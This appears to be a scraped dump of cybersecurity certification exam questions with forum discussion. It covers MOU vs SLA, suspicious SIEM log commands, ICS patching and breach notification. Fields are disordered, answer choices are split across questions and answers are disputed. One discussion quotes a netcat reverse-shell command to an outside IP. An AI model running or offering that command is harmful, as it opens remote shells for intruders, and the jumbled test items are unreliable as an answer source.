questions.question_text: The IT department at a growing law firm wants to begin using a third-party vendor for vulnerability monitoring and mitigation. The executive director of the law firm wishes to outline the assumptions and expectations between the two companies. Which of the following documents might be referenced in the event of a security breach at the law firm?

discussion.content: A SLA is much more formal than the MOU. The SLA defines KPI's for services etc. and not assumptions and expectations. SLA is not what you expect but what is agreed upon and part of the contract. MoU seems the correct answer
Dealing with a law firm... Think they want an MOU?
"In the event of security breach" implies to select SLA

An agreement is a legal document that is formed after finalizing the deal and it is a binding document. Memorandum of Understanding (MoU) is actually just a means for two parties to reach a decision. ... The MoU is nothing more than a formal handshake B. MOU

n agreement is a legal document that is formed after finalising the deal and it is binding document. Memorandum of Understanding (MoU) is actually just a means for two parties to reach a decision. ... The MoU is nothing more than a formal handshake

Very doubtful it's SLA. Everyone is referencing the fact that SLA is legally binding, so why would that document merely outline assumptions/expectations? Outline is a very weak word.

Then again, could just be CompTIA pullin' a fast one.

Nothing specified on "Legally binding"; 
MOU are less formal documents that outline the relationship between two organizations. I would go with this too.

comments.content: MOU is an informal agreement. SLA is legal binding
i jumped to SLA on the use of "expectations"
A MOU is not legally binding, an SLA is.

questions.question_text: A security analyst is performing a routine check on the SIEM logs related to the commands used by operators and detects several suspicious entries from different users. Which of the following would require immediate attention?

discussion.content: This question is on the exam.

comments.content: Command should be nc -e though, but I'm assuming it's a typo... .
It does ask what to do NEXT. I guess you would need to open robots.txt to get all the required info befor starting the incident response process

discussion.content: This should be A. The command "nc -o /bin/sh 72.14.1.36 4444" creates a reverse shell, and this has been confirmed via netstat.
This question is on the exam.

choices.B: Recommend training to avoid mistakes in production command files
choices.C: Delete the unknown files from the production servers
choices.A: Initiate the security incident response process
choices.E: Manually review the robots .txt file for errors
choices.D: Patch a new vulnerability that has been discovered

questions.question_text: In comparison to non-industrial IT vendors, ICS equipment vendors generally:

choices.B: have more mature software development models.
choices.A: rely less on proprietary code in their hardware products.

comments.content: Yeah this is C... . Anything else just doesn't make sense here.
I guess the assumption is that ICS are not updated at all. But then again A doesn't make a lot of sense

From the Cybersecurity Analyst Certification Bundle:
"Much of the software that runs an ICS is burned into the firmware of devices such as programmable logic controllers (PLC), like the ones that run the uranium enrichment centrifuges targeted by Stuxnet. This is a source of vulnerabilities because updating this software cannot normally be done automatically or even centrally. The patching and updating, which is pretty infrequent to begin with, typically requires that the device be brought offline and manually updated by a qualified technician. Between the cost and effort involved and the effects of interrupting business processes, it should not come as a surprise to learn that many ICS components are never updated or patched. To make matters worse, vendors are notorious for not providing patches at all, even when vulnerabilities are discovered and made public. In its 2016 report on ICS security, FireEye described how 516 of the 1552 known ICS vulnerabilities had no patch available."

discussion.content: This question was on the exam (october-2020)

choices.C: Impact on the reputation of the company's name/brand

questions.question_text: A company office was broken into over the weekend. The office manager contacts the IT security group to provide details on which servers were stolen. The security analyst determines one of the stolen servers contained a list of customer PII information, and another server contained a copy of the credit card transactions processed on the Friday before the break-in. In addition to potential security implications of information that could be gleaned from those servers and the rebuilding/restoring of the data on the stolen systems, the analyst needs to determine any communication or notification requirements with respect to the incident. Which of the following items is MOST important when determining what information needs to be provided, who should be contacted, and when the communication needs to occur.
